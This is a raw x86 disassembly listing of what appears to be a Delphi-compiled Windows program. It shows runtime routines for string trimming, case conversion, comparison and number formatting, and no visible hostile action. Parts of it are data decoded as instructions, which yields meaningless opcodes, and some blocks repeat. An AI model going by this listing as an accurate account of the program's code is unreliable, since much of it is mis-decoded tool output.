add [ eax ] al
les eax [ edx + 0x41ac0040 ]
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ edx ] dl
inc ebp
push ebx
popad
arpl [ gs : ecx + 0x6c ] sp
insb
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
add [ esi ] cl
inc ebp
inc ecx
bound esi [ ebx + 0x74 ]
jb r-xdata
push esp
aas
inc eax
movsb [ edi ] [ esi ]
mov [ eax ] es
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
mov [ eax ] es
adc [ eax ] al
add [ eax ] al
les eax [ edx + 0x41ac0040 ]
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ eax ] cl
inc ebp
dec edi
push ebx
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 4 + 0x100040 ] ah
jb r-xdata
inc eax
add [ edi + edi + 0x40 ] dl
add [ edx ] cl
inc ebp
push eax
jb r-xdata
sbb [ edi ] bh
fmul [ edx + 0x40 ]
mov ah 0x41
inc eax
add ah bh
inc eax
push ebp
je r-xdata
lea eax [ eax ]
adc [ ebx ] eax
aaa
push esp
add [ eax ] al
add [ eax - 0x73 ] al
inc eax
add [ eax + eax - 0x72a80000 ] al
inc eax
add [ eax - 0x73000000 ] ah
je r-xdata
xor al 0x4
add [ eax ] al
add [ eax + 0x48004010 ] dh
add [ eax ] al
add [ eax + 0x8004010 ] dh
add [ ecx ] dl
add ebp [ esi ]
aaa
outsb
jae r-xdata
or al 0x0
add [ eax ] al
mov al 0x10
inc eax
add [ ebp - 0x72d3ffc0 ] cl
inc eax
add [ 0x34332e03 ] cl
xor [ eax ] al
add [ eax ] al
or al 0x0
add [ eax ] al
mov al 0x10
inc eax
add [ ebp - 0x72bbffc0 ] cl
inc eax
add [ 0x34342e03 ] cl
outsd
jb r-xdata
jae r-xdata
adc [ ebp + 0x41 ] al
dec eax
mov [ eax ] es
add [ eax ] al
add [ eax ] al
loopne r-xdata
je r-xdata
add [ eax ] bl
aas
inc eax
add [ eax + 0x130040f4 ] ch
push esp
push esp
push 0x64616572
dec esp
outsd
arpl [ ecx + 0x6c ] sp
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
insb
jae r-xdata
push ebx
jns r-xdata
mov al 0x10
inc eax
add [ eax ] cl
add [ eax ] al
mov al 0x10
inc eax
add [ eax ] cl
inc eax
add ah ch
imul ebp [ esi + 0x67 ] 0xc073
sbb al 0x0
add [ eax ] al
pop es
add [ eax ] al
add [ eax - 0x72ffbff0 ] dh
inc eax
add [ ebp + ecx * 4 + 0x40 ] bl
add [ 0x34352e03 ] cl
sbb al 0x0
add [ eax ] al
pop es
add [ eax ] al
add [ eax - 0x72ffbff0 ] dh
inc eax
add [ ebp + ecx * 4 + 0x40 ] dh
xor al 0x34
add [ ebx ] cl
add [ eax ] al
add [ eax + 0x8004010 ] dh
add [ eax ] al
add [ eax + 0xc004010 ] dh
add [ eax ] al
add [ eax + 0x10004010 ] dh
add [ eax ] al
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ esi ] cl
inc ebp
dec ecx
outsb
je r-xdata
add ah bh
inc eax
inc eax
add ah bh
mov [ eax ] es
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x408edc3f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop [ fs : eax ]
clc
mov es [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop [ fs : eax ]
xor [ eax ] al
add [ eax ] al
mov al 0x11
inc eax
add [ ecx + eax * 2 + 0x6b740040 ] ch
inc eax
add [ eax - 0x3fffbf95 ] al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x6b900040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ esi + esi * 8 + 0x40 ] bl
add [ esp + edx * 2 ] ah
dec ebp
jne r-xdata
jb r-xdata
add [ eax ] al
add [ eax + 0x14004010 ] dh
add [ eax ] al
add [ eax + 0x18004010 ] dh
add [ eax ] al
add [ eax + 0x1c004010 ] dh
adc [ eax ] al
or al 0x0
add [ eax ] al
mov al 0x10
inc eax
add [ eax ] dl
rcl [ eax ] 0x8e
inc eax
add [ ecx ] dl
add ebp [ esi ]
cmp [ esp + eax ] dh
add [ eax ] al
add [ eax + 0x48004010 ] dh
add [ eax ] al
add [ eax + 0x8004010 ] dh
push ebx
jns r-xdata
adc eax rw-data
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
outsb
imul edi [ edx + 0x65 ] r-xdata
ror [ eax + eax ] cl
je r-xdata
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
add eax 0xffffffd4
jmp sub_40f7e4
int3
push ebp
je r-xdata
call sub_4047d8
pop edi
pop esi
pop ebx
retn
call sub_40dcac
push edx
popad
inc ebp
js r-xdata
inc ebx
outsd
jne r-xdata
insb
jae r-xdata
insb
jne r-xdata
add [ eax ] al
add [ eax + 0x20004010 ] dh
add [ eax ] al
add [ eax ] dl
lea eax [ eax ]
and al 0x0
add [ eax ] al
sub [ ebp + 0x540040 ] cl
add [ eax ] al
inc eax
lea eax [ eax ]
test [ eax ] al
add [ eax ] al
pop eax
lea eax [ eax ]
mov al [ 0xffffffff8d000000 ]
sar bh 0xff
dec edx
add [ ebx + 0x50158910 ] cl
imul esi [ esi + 0x65 ] 0x74697257
push ebx
jns r-xdata
dec edx
add bh al
add ah ah
pop [ eax ]
pop ebx
retn
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_402d44
call ebx
pop ebx
retn
add [ ebx + 0x4ab04415 ] cl
add [ ebx + 0xa890448 ] cl
js r-xdata
push eax
arpl [ eax + 0x72 ] bp
outsd
sub_408edc
mov ebp 0xc700408e
mov es [ eax ]
ror [ esi - 0x7162ffc0 ] 0x1
inc eax
add [ ebp - 0x52ffbf72 ] ah
mov es [ eax ]
mov ch 0x8e
inc eax
add [ ecx ] al
add [ eax ] al
add [ edx - 0x74 ] dl
adc [ ebx - 0x71 ] bh
sbb eax 0xdf9c4cdb
push edi
loopne r-xdata
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x408edc3f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop [ fs : eax ]
clc
mov es [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop [ fs : eax ]
xor [ eax ] al
add [ eax ] al
mov al 0x11
inc eax
add [ ecx + eax * 2 + 0x6b740040 ] ch
inc eax
add [ eax - 0x3fffbf95 ] al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x6b900040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ esi + esi * 8 + 0x40 ] bl
add [ esp + edx * 2 ] ah
dec ebp
jne r-xdata
adc eax rw-data
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
outsb
imul edi [ edx + 0x65 ] r-xdata
ror [ eax + eax ] cl
je r-xdata
call sub_4047d8
pop edi
pop esi
pop ebx
retn
call sub_40dcac
push edx
popad
inc ebp
js r-xdata
insb
jne r-xdata
dec edx
add [ ebx + 0x50158910 ] cl
imul esi [ esi + 0x65 ] 0x74697257
push ebx
jns r-xdata
dec edx
add bh al
add ah ah
pop [ eax ]
pop ebx
retn
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_402d44
call ebx
pop ebx
retn
add [ ebx + 0x4ab04415 ] cl
add [ ebx + 0xa890448 ] cl
js r-xdata
push eax
arpl [ eax + 0x72 ] bp
outsd
sub_408f8c
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_408fc0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dcac
call sub_4047d8
pop edi
pop esi
pop ebx
retn
sub_408fe4
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_402d44
call ebx
pop ebx
retn
sub_409010
push ebx
mov ebx eax
mov eax 0xc
call sub_402d28
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_408fe4
pop ebx
retn
sub_409048
push ebx
push esi
push edi
mov esi eax
mov eax edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
jmp sub_404e44
mov edx [ esi - 0x4 ]
mov edi eax
test edx edx
jle r-xdata
mov ecx [ eax ]
mov ebx edx
test ecx ecx
je r-xdata
mov edx ebx
or edx 0x3
call sub_4055ac
test edx 0x3
jne r-xdata
mov ecx eax
or eax 0x80808080
mov edx eax
sub eax 0x7b7b7b7b
xor edx ecx
or eax 0x80808080
sub eax 0x66666666
and eax edx
shr eax 0x2
xor eax ecx
mov [ edi + ebx ] eax
mov eax [ esi + ebx - 0x4 ]
sub ebx 0x4
jge r-xdata
pop edi
pop esi
pop ebx
retn
or edx 0x2
xor edx [ ecx - 0x4 ]
cmp edx 0x1
ja r-xdata
xor edx [ ecx - 0x4 ]
cmp edx 0x3
jbe r-xdata
cmp [ ecx - 0x8 ] 0x1
je r-xdata
jmp r-xdata
mov edi [ edi ]
mov [ edi - 0x4 ] ebx
mov [ edi + ebx ] 0x0
add ebx 0xffffffff
and ebx 0xfffffffc
mov eax [ esi + ebx ]
sub_4090e4
push ebx
push esi
push edi
mov esi eax
mov eax edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
jmp sub_404e44
mov edx [ esi - 0x4 ]
mov edi eax
test edx edx
jle r-xdata
mov ecx [ eax ]
mov ebx edx
test ecx ecx
je r-xdata
mov edx ebx
or edx 0x3
call sub_4055ac
test edx 0x3
jne r-xdata
mov ecx eax
or eax 0x80808080
mov edx eax
sub eax 0x5b5b5b5b
xor edx ecx
or eax 0x80808080
sub eax 0x66666666
and eax edx
shr eax 0x2
xor eax ecx
mov [ edi + ebx ] eax
mov eax [ esi + ebx - 0x4 ]
sub ebx 0x4
jge r-xdata
pop edi
pop esi
pop ebx
retn
or edx 0x2
xor edx [ ecx - 0x4 ]
cmp edx 0x1
ja r-xdata
xor edx [ ecx - 0x4 ]
cmp edx 0x3
jbe r-xdata
cmp [ ecx - 0x8 ] 0x1
je r-xdata
jmp r-xdata
mov edi [ edi ]
mov [ edi - 0x4 ] ebx
mov [ edi + ebx ] 0x0
add ebx 0xffffffff
and ebx 0xfffffffc
mov eax [ esi + ebx ]
sub_409180
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_4091b0
add eax ecx
add edx ecx
xor ecx 0xffffffff
add eax 0xfffffff8
add edx 0xfffffff8
add ecx 0x9
push ebx
jg r-xdata
cmp ecx 0x4
jg r-xdata
mov ebx [ ecx + eax ]
cmp ebx [ ecx + edx ]
jne r-xdata
cmp ecx 0x6
jg r-xdata
mov ebx [ ecx + eax ]
cmp ebx [ ecx + edx ]
jne r-xdata
xor eax eax
pop ebx
retn
lea ebx [ ecx + eax ]
add ecx 0x4
and ebx 0x3
sub ecx ebx
jg r-xdata
cmp ecx 0x7
jg r-xdata
movzx ebx [ ecx + eax ]
cmp bx [ ecx + edx ]
jne r-xdata
add ecx 0x4
mov ebx [ ecx + eax ]
cmp ebx [ ecx + edx ]
jne r-xdata
mov eax 0x1
pop ebx
retn
movzx ebx [ eax + 0x7 ]
cmp bl [ edx + 0x7 ]
jne r-xdata
add ecx 0x2
mov ebx [ ecx + eax + 0x4 ]
cmp ebx [ ecx + edx + 0x4 ]
jne r-xdata
add ecx 0x8
jg r-xdata
mov ebx [ ecx + eax ]
cmp ebx [ ecx + edx ]
jne r-xdata
mov ebx [ ecx + eax + 0x4 ]
cmp ebx [ ecx + edx + 0x4 ]
jne r-xdata
add ecx 0x8
jle r-xdata
sub_409244
test eax eax
jne r-xdata
test edx edx
jne r-xdata
test edx edx
je r-xdata
push ebx
push ebp
push esi
mov ebp [ eax - 0x4 ]
mov ebx [ edx - 0x4 ]
sub ebp ebx
sbb ecx ecx
and ecx ebp
add ecx ebx
lea esi [ ecx + eax ]
add edx ecx
neg ecx
je r-xdata
mov eax [ eax - 0x4 ]
retn
retn
mov eax [ edx - 0x4 ]
neg eax
mov eax ebp
movzx eax [ ecx + esi ]
movzx ebx [ ecx + edx ]
cmp eax ebx
je r-xdata
add ecx 0x2
jl r-xdata
cmp al bl
je r-xdata
shr eax 0x8
shr ebx 0x8
cmp al 0x61
jl r-xdata
mov ah 0x0
mov bh 0x0
cmp al 0x61
jl r-xdata
cmp bl 0x61
jl r-xdata
cmp al 0x7a
jg r-xdata
cmp bl 0x61
jl r-xdata
cmp al 0x7a
jg r-xdata
sub eax ebx
jne r-xdata
cmp bl 0x7a
jg r-xdata
sub eax 0x20
sub eax ebx
jne r-xdata
cmp bl 0x7a
jg r-xdata
sub eax 0x20
pop esi
pop ebp
pop ebx
retn
sub ebx 0x20
movzx eax [ ecx + esi ]
movzx ebx [ ecx + edx ]
cmp ah bh
je r-xdata
sub ebx 0x20
sub_4092e0
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_409244
test eax eax
jne r-xdata
sub_409304
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
test eax eax
je r-xdata
mov ebx eax
mov eax esi
call sub_405324
mov edx eax
mov eax edi
mov ecx ebx
call sub_404f34
test ebx ebx
jle r-xdata
sub eax 0x4
mov eax [ eax ]
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharUpperBuffA
sub_40933c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
test eax eax
je r-xdata
mov ebx eax
mov eax esi
call sub_405324
mov edx eax
mov eax edi
mov ecx ebx
call sub_404f34
test ebx ebx
jle r-xdata
sub eax 0x4
mov eax [ eax ]
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharLowerBuffA
sub_409374
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov ebx edi
test ebx ebx
je r-xdata
mov esi ebp
test esi esi
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
push esi
mov eax ebp
call sub_405324
push eax
push ebx
mov eax edi
call sub_405324
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop ebp
pop edi
pop esi
pop ebx
retn
sub esi 0x4
mov esi [ esi ]
sub_4093b8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_4093d8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
test eax eax
je r-xdata
mov esi eax
mov ebx 0x1
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_404e44
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_405384
pop ebp
pop edi
pop esi
pop ebx
retn
sub_40942c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_4057dc
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx * 2 - 0x2 ] 0x20
jbe r-xdata
cmp [ edi + esi * 2 - 0x2 ] 0x20
jbe r-xdata
mov eax ebp
call sub_40566c
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_405924
pop ebp
pop edi
pop esi
pop ebx
retn
sub_40947c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
test eax eax
je r-xdata
mov ebx 0x1
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
cmp eax ebx
jl r-xdata
push edi
mov ecx 0x7fffffff
mov edx ebx
mov eax esi
call sub_405384
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
jbe r-xdata
inc ebx
sub_4094b4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
test eax eax
je r-xdata
mov ebx eax
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
test ebx ebx
jle r-xdata
push edi
mov ecx ebx
mov edx 0x1
mov eax esi
call sub_405384
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
jbe r-xdata
dec ebx
sub_4094ec
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov ebx edx
mov esi eax
mov eax [ esp ]
call sub_404e44
cmp [ esi ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
cmp bl [ eax ]
jne r-xdata
inc [ esi ]
mov ebp 0x1
mov edi [ esi ]
mov eax [ esi ]
mov edx ebx
call sub_40eac4
mov [ esi ] eax
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
inc [ esi ]
mov eax [ esi ]
cmp bl [ eax ]
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
inc [ esi ]
inc ebp
mov eax [ esi ]
mov edx ebx
call sub_40eac4
mov [ esi ] eax
mov eax [ esi ]
sub eax edi
cmp eax 0x1
jle r-xdata
mov eax edi
call sub_40a320
mov [ esi ] eax
cmp ebp 0x1
jne r-xdata
mov edx eax
sub edx ebp
mov eax [ esp ]
call sub_4055ac
mov eax [ esp ]
mov eax [ eax ]
call sub_405324
mov ebp eax
mov edx ebx
mov eax edi
call sub_40eac4
mov [ esi ] eax
jmp r-xdata
mov ecx eax
dec ecx
mov eax [ esp ]
mov edx edi
call sub_404f34
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
inc [ esi ]
mov eax [ esi ]
cmp bl [ eax ]
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov ecx [ esi ]
sub ecx edi
mov edx ebp
mov eax edi
call sub_402f9c
mov eax [ esi ]
sub eax edi
add ebp eax
inc [ esi ]
mov edi [ esi ]
mov eax [ esi ]
mov edx ebx
call sub_40eac4
mov [ esi ] eax
mov ecx [ esi ]
sub ecx edi
dec ecx
mov edx ebp
mov eax edi
call sub_402f9c
mov eax edi
call sub_40a320
mov [ esi ] eax
sub_4095ec
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1 ] dl
mov edi eax
xor eax eax
push ebp
push sub_409753
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx edi
mov edx edi
mov eax edx
test eax eax
je r-xdata
lea esi [ eax + ebx ]
mov eax edx
test eax eax
je r-xdata
sub eax 0x4
mov eax [ eax ]
mov [ ebp - 0xc ] eax
cmp esi ebx
jbe r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x14 ]
mov edx ebx
call sub_40503c
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
movzx eax [ ebx ]
sub al 0xa
je r-xdata
cmp eax [ ebp - 0xc ]
jne r-xdata
sub eax 0x4
mov eax [ eax ]
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
sub al 0x3
je r-xdata
mov ebx edi
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
xor edx edx
call sub_404f34
mov edi [ ebp - 0x8 ]
mov edi [ edi ]
cmp esi ebx
jbe r-xdata
mov eax [ ebp - 0x8 ]
mov edx edi
call sub_404e98
jmp r-xdata
inc ebx
inc [ ebp - 0xc ]
jmp r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40975a
lea eax [ ebp - 0x14 ]
call sub_404e44
retn
movzx eax [ ebx ]
sub al 0xa
je r-xdata
cmp [ ebx + 0x1 ] 0xa
jne r-xdata
cmp [ ebx + 0x1 ] 0xa
jne r-xdata
movzx eax [ ebx ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
sub al 0x3
je r-xdata
dec [ ebp - 0xc ]
jmp r-xdata
inc [ ebp - 0xc ]
jmp r-xdata
inc ebx
jmp r-xdata
mov eax ebx
call sub_40e7c8
mov ebx eax
jmp r-xdata
mov [ edi ] 0xa
inc edi
inc ebx
jmp r-xdata
mov [ edi ] 0xd
inc edi
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
jmp r-xdata
cmp esi ebx
ja r-xdata
cmp esi ebx
ja r-xdata
mov [ edi ] 0xa
inc edi
inc ebx
cmp [ ebx ] 0xa
jne r-xdata
mov [ edi ] 0xd
inc edi
movzx eax [ ebx ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
inc ebx
jmp r-xdata
movzx eax [ ebx ]
mov [ edi ] al
inc edi
inc ebx
mov eax ebx
call sub_40e7a8
mov [ ebp - 0x10 ] eax
mov edx edi
mov eax ebx
mov ecx [ ebp - 0x10 ]
call sub_402f9c
mov eax [ ebp - 0x10 ]
add edi eax
mov eax [ ebp - 0x10 ]
add ebx eax
jmp r-xdata
sub_409764
push esi
push edi
mov edi eax
xor eax eax
mov esi edi
mov ecx esi
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
sub ecx 0x4
mov ecx [ ecx ]
movzx ecx [ edi ]
add cl 0xbf
sub cl 0x1a
jb r-xdata
mov cl 0x1
jmp r-xdata
mov cl 0x1
sub cl 0x4
je r-xdata
test cl cl
jne r-xdata
pop edi
pop esi
retn
test dl dl
je r-xdata
add cl 0xfe
sub cl 0x1a
jb r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx esi
test edx edx
je r-xdata
xor ecx ecx
jmp r-xdata
sub edx 0x2
jl r-xdata
sub edx 0x4
mov edx [ edx ]
sub edx 0x2
jl r-xdata
sub edx 0x4
mov edx [ edx ]
xor cl 0x1
mov al 0x1
inc edx
mov esi 0x2
inc edx
mov esi 0x2
inc esi
dec edx
jne r-xdata
add cl 0xf9
sub cl 0x1a
jb r-xdata
inc esi
dec edx
jne r-xdata
add cl 0xfe
sub cl 0xa
jb r-xdata
movzx ecx [ edi + esi - 0x1 ]
add cl 0xd0
sub cl 0xa
jb r-xdata
sub cl 0x4
je r-xdata
movzx ecx [ edi + esi - 0x1 ]
sub cl 0x2e
je r-xdata
jmp r-xdata
add cl 0xf9
sub cl 0x1a
jb r-xdata
add cl 0xfe
sub cl 0x1a
jae r-xdata
sub cl 0x4
je r-xdata
add cl 0xfe
sub cl 0x1a
jae r-xdata
sub_409830
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_409846
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_409846
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_409846
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_40987c
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_409830
mov edx esi
pop eax
call sub_404f34
add esp 0x10
pop esi
retn
sub_40989c
or cl cl
jne sub_4098d0
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_4098d0
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_4098d0
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_4098d0
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_409968
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_40989c
mov edx esi
pop eax
call sub_404f34
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_409990
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_409830
mov edx esi
pop eax
call sub_404f34
add esp 0x20
pop esi
retn
xor edx edx
sub_4099b8
push ebp
mov ebp esp
cmp eax 0x20
jle r-xdata
push esi
mov esi esp
sub esp 0x20
mov ecx 0x10
push edx
mov edx eax
lea eax [ ebp + 0x8 ]
call sub_40989c
mov edx esi
pop eax
call sub_404f34
add esp 0x20
pop esi
pop ebp
retn 0x8
xor eax eax
sub_4099e8
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_4038d8
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_408fc0
sub_409a3c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_4038d8
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_409a5c
push ebp
mov ebp esp
add esp 0xfffffff4
lea edx [ ebp - 0xc ]
call sub_406030
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
sub_409a90
mov eax [ rw-data ]
call sub_406248
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_406248
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_404e98
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_404e98
sub_409b20
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
